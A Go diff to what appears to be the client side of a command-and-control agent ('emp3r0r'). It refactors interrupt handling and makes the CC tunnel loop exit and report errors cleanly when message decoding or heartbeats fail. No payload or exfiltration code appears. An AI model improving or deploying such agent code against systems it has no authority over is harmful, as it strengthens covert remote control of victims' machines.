@@ -5,6 +5,7 @@ import (
 	"context"
 	"encoding/json"
 	"errors"
+	"fmt"
 	"io/ioutil"
 	"log"
 	"net"
@@ -62,13 +63,13 @@ func IsCCOnline() bool {
 	return strings.Contains(string(data), "emp3r0r")
 }
 
-func catchSignal(cancel context.CancelFunc) {
+func catchInterruptAndExit(cancel context.CancelFunc) {
 	sig := make(chan os.Signal, 1)
 	signal.Notify(sig, os.Interrupt)
 	<-sig
 	log.Println("Cancelling due to interrupt")
-	os.Exit(0)
 	cancel()
+	os.Exit(0)
 }
 
 // ConnectCC connect to CC with h2conn
@@ -103,14 +104,15 @@ func CCTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 		out = json.NewEncoder(CCConn)
 		msg TunData // data being exchanged in the tunnel
 	)
-	go catchSignal(cancel)
+	go catchInterruptAndExit(cancel)
 	defer func() {
-		cancel()
-
 		err = CCConn.Close()
 		if err != nil {
 			log.Print("CCTun closing: ", err)
 		}
+
+		cancel()
+		log.Print("CCTun closed")
 	}()
 
 	// check for CC server's response
@@ -120,8 +122,8 @@ func CCTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 			// read response
 			err = in.Decode(&msg)
 			if err != nil {
-				log.Print(err)
-				continue
+				log.Print("check CC response: JSON msg decode: ", err)
+				break
 			}
 			payload := msg.Payload
 			if payload == "hello" {
@@ -157,9 +159,16 @@ func CCTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 	for ctx.Err() == nil {
 		time.Sleep(1 * time.Second)
 		if !sendHello(10) {
-			log.Println("CC disconnected, restarting...")
-			return errors.New("CC disconnected")
+			log.Print("sendHello failed after 10 tries")
+			break
 		}
 	}
-	return ctx.Err()
+
+	if err == nil {
+		err = errors.New("CC disconnected")
+	}
+	if ctx.Err() != nil {
+		err = fmt.Errorf("ctx: %v\nerr: %v", ctx.Err(), err)
+	}
+	return err
 }
